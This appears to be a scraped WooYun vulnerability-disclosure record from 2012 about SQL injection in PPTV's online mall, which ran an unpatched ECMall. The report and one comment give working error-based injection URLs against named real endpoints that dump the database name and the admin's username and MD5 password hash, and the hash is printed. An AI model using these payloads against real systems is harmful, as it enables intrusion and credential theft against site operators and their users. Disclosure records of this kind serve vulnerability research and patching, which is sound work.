{"id": 16782, "wybug_id": "wooyun-2012-012020", "wybug_title": "PPTV商城存在注入漏洞,可能getshell", "wybug_corp": "PPTV(PPlive)", "wybug_author": "y35u", "wybug_date": "2012-09-11 11:26", "wybug_open_date": "2012-10-26 11:26", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "数字类型注射", "管理员密码泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-09-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-09-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-09-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-10-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-10-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-10-26：\t细节向公众公开  简要描述： 原因来自pptv采用了某开源商城系统，而且没有即时打补丁，导致一个历史漏洞被成功利用。 详细说明：  运用了ECMALL开源程序，其中，index.php?app=order&act=check_coupon&coupon_sn=1&store_id=1存在注入漏洞1，先注册一个用户2，\nhttp://pmall.pptv.com/index.php?app=order&act=check_coupon&coupon_sn=1&store_id=1 and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,unhex(hex(database())),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1\n\n\n爆得数据库名称：vas_pmall3.其实上面要不要无所谓拉通过报错信息得知，表前缀是SH（当然也可以自己爆一个表看看）4，\nhttp://pmall.pptv.com/index.php?app=order&act=check_coupon&coupon_sn=1&store_id=1%20and%28select%201%20from%28select%20count%28*%29,concat%28%28select%20%28select%20%28select%20concat%280x7e,0x27,%20sh_member.user_name,0x27,0x7e,%20sh_member.password,0x7e,0x27%29%20from%20sh_member%20limit%200,1%29%29%20from%20information_schema.tables%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20and%201=1\n\n\n爆得管理员账户密码admin  468f7365337d1fcaf00211fa52e3df64MD5还在破解中   漏洞证明：  看详细说明吧   修复方案：  打补丁，找ECMALL去   版权声明：转载请注明来源 y35u@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-09-11 16:28 厂商回复： 感谢白帽子，这个已知问题一直没复现，感谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-09-11 15:02 |    \t\t伟大娃娃 \t\t\t( 普通白帽子  |\t\t\t        Rank:130 漏洞数:10        | 改变世界)\t\t \n  index.php?app=my_goods&act=brand_edit&id=1%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e27,%20ecm_member.user_name,0×27,0x7e,%20ecm_member.password,0x7e,0×27)%20from%20ecm_member%20limit%200,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)这个么    \n     2012-09-11 16:51 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @伟大娃娃 这样做 很不和谐    \n     2012-09-11 18:54 |    \t\tyy520 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:12        )\t\t \n  。。。。这个历史漏洞是昨天发布的吗    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}